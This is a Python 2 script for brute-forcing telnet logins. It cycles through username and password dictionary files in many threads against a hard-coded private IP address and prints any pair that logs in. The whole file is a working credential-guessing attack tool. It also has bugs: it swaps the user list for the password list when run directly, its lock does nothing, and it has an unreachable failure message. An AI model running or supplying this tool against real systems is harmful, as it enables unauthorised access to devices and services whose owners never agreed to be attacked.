import threading
import time
import random
import sys
import telnetlib
from copy import copy
class telnetlibs:
	server=''
	passwordlist="dict/telnet_pass.dic"
	userlist="dict/telnet_user.dic"
	users=''
	users_index=0
	password=''
	password_index=0
	isfind=False
	def __init__(self,server):
		self.server=server
		self.open_wordlist_file()
		self.open_passwordlist_file()

	def open_wordlist_file(self):
		if __name__=='__main__':
			self.userlist="../dict/telnet_pass.dic"
		try:
			users=open(self.userlist,'r').readlines()
			self.users=users
		except(IOError):
			print "[-]Error:wordlist path wrong!"
			sys.exit(1)
	def open_passwordlist_file(self):
		if __name__=='__main__':
			self.passwordlist="../dict/telnet_pass.dic"
		try:
			password=open(self.passwordlist,'r').readlines()
			self.password=password
		except(IOError):
			print "[-]Error:passwordlist path wrong!"
			sys.exit(1)

	def getword(self):
		lock=threading.Lock()
		lock.acquire()
		if len(self.users)<=self.users_index:
			if len(self.password)<=self.password_index:
				lock.release()
				return
			else:
				self.users_index=0
				self.password_index+=1
		#print self.users[self.users_index]
		#print self.password[self.password_index]
		self.users_index+=1
		lock.release()
		return self.users[self.users_index-1],self.password[self.password_index]

	def thread_handle(self,user,pwd):
		try:
			#print user,pwd
			user=user.strip("\n")
			user=user.strip("\r")
			pwd=pwd.strip("\n")
			pwd=pwd.strip("\r")
			#time.sleep(1)
			tn=telnetlib.Telnet(self.server,timeout=0.5)
			tn.read_until("Username: ")
			tn.write(user+"\n")
			tn.read_until("Password: ")
			tn.write(pwd+"\n")
			#for i in range(1,1):
				#tn.write("exit"+"\n")
			#time.sleep(3)
			ans=tn.read_some()
			tn.write("exit"+"\n")
			tn.close()
			#print ans
			#print ans.find("invalid")
			if ans.find("invalid")!=-1:
				#print "login fail"
				pass
			else:
				print "login success"
				print "username: "+user+"\n"+"password: "+pwd+"\n"
				self.isfind=True
				return
		except Exception as e:
			#print "[-]Exception:  %s" % e
			pass

	def run(self):
		#th=threading.Thread(target=self.thread_handle,args=("aadmin","admin",))
		#th.start()
		#time.sleep(30)
		for i in range(0,len(self.users)*len(self.password)):
			if self.isfind==True:
				return
			user,pwd=self.getword()
			#print user,pwd
			th=threading.Thread(target=self.thread_handle,args=(user,pwd,))
			if i==len(self.users)*len(self.password) and self.isfind==False:
				print "[-]No passwd found.Try to use a big dict"
			th.start()
			#th.join()






if __name__=='__main__':
	a=telnetlibs("192.168.237.66")
	#a.run()
	a.run()

			
